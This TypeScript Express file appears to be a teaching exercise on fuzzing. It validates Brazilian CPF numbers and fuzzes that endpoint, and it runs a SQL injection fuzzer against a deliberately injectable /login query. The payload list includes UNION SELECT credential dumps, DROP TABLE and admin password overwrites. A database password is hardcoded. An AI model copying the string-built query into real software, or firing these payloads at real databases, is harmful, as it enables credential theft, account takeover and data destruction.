import express, {Request, Response} from 'express';
import bodyParser from 'body-parser';
import axios from 'axios';
import {Pool} from "pg";

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(express.json());

const db =  new Pool({
    host: 'localhost',
    user: 'postgres',
    password: '12345678',
    database: 'bdaula',
    port: 5432
});


function generationBasedInputs(): string[] {
  return [
    '123.456.789-00',     // válido
    '000.000.000-00',     // válido
    '12345678900',        // sem pontuação
    'abc.def.ghi-jk',     // letras
    '111-222-333.44',     // pontuação incorreta
    '',                   // vazio
    '999.999.999-000',    // dígitos extras
    '...---...',          // só símbolos
  ];
}


function sqlIFuzzing(): string[] {
  return [
    "'",                             
    "'; --",                         
    "'; OR '1'='1",                  
    "'; OR 'a'='a",                  
    "'; SELECT * FROM users--",      
    "'; UNION SELECT null,username,password FROM users--",  
    "' UNION ALL SELECT NULL, NULL, NULL, CONCAT(username, ':', password) FROM users--",  
    "'; DROP TABLE users--",         
    "'; INSERT INTO users(username, password) VALUES ('attacker', 'password')--",  
    "'; UPDATE users SET password='newpassword' WHERE username='admin'--",  
]
}


function mutateCPF(cpf: string): string {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789.-';
  const cpfArray = cpf.split('');

  // Mutar 1 a 3 caracteres aleatórios
  const mutations = Math.floor(Math.random() * 3) + 1;
  for (let i = 0; i < mutations; i++) {
    const index = Math.floor(Math.random() * cpfArray.length);
    const newChar = chars[Math.floor(Math.random() * chars.length)];
    cpfArray[index] = newChar;
  }

  return cpfArray.join('');
}



// ==============================
// 1. ENDPOINT /cpf
// ==============================

/**
 * POST /cpf
 * Espera um campo "cpf" no formato ###.###.###-##
 */
app.post('/cpf', (req:Request, res:Response) => {
  const { cpf } = req.body;

  const regexCPF = /^\d{3}\.\d{3}\.\d{3}-\d{2}$/;

  if (typeof cpf !== 'string') {
    return res.status(400).json({ error: 'CPF deve ser uma string.' });
  }

  if (!regexCPF.test(cpf)) {
    return res.status(400).json({ error: 'Formato de CPF inválido.' });
  }

  return res.status(200).json({ message: 'Formato de CPF válido.' });
});






// ==============================
// 3. FUZZER
// ==============================
async function testFuzzing() {
  const url = 'http://localhost:3000/cpf';

  // 1. Generation-based
  for (const cpf of generationBasedInputs()) {
    await sendRequest(url, { cpf }, 'Generation-based');
  }

  // 2. Mutation-based
  for (let i = 0; i < 10; i++) {
    const mutated = mutateCPF('123.456.789-00');
    await sendRequest(url, { cpf: mutated }, 'Mutation-based');
  }

}

async function sendRequest(url: string, payload: any, method: string) {
  try {
    const res = await axios.post(url, payload);
    console.log(`✅ ${method} → ${JSON.stringify(payload)} → ${res.status}`);
  } catch (err: any) {
    const status = err.response?.status || 'erro';
    console.log(`❌ ${method} → ${JSON.stringify(payload)} → ${status}`);
  }
}





app.post('/login', async (req, res) => {
  const { usuario, senha } = req.body;
  const query = `SELECT * FROM users WHERE username = '${usuario}' AND password = '${senha}'`;
  try{
          const result = await db.query(query);

          if(result.rowCount !== 0){
              res.json({message: "Login bem-sucedido"});
          }else{
              res.status(401).json({message:"Usuário ou Senha Inválidos"});
          }
      }catch(e:any){
          res.status(500).json({message: "Erro no servidor"});
      }
});

async function fuzzSQLi() {
  const url = 'http://localhost:3000/login';

  

  for (const mutacao of sqlIFuzzing()) {
    const senhaMutada = "admin" + mutacao;

    try {
      const res = await axios.post(url, {
        usuario: 'admin',
        senha: senhaMutada,
      });

      console.log(`🟢 [SQLI]
          SELECT * FROM Users WHERE usuario = user AND password = ${senhaMutada} ; → Status: ${res.status}`);
    } catch (err: any) {
      const status = err.response?.status || 'erro';
      console.log(`🔴 [SQLI] 
          SELECT * FROM Users WHERE usuario = user AND password = ${senhaMutada}; → Status: ${status}`);
    }
  }
}

app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}/cpf`);
   setTimeout(() => {
    testFuzzing();       // CPF fuzz
    fuzzSQLi() // SQLi fuzz
  }, 1000);
});
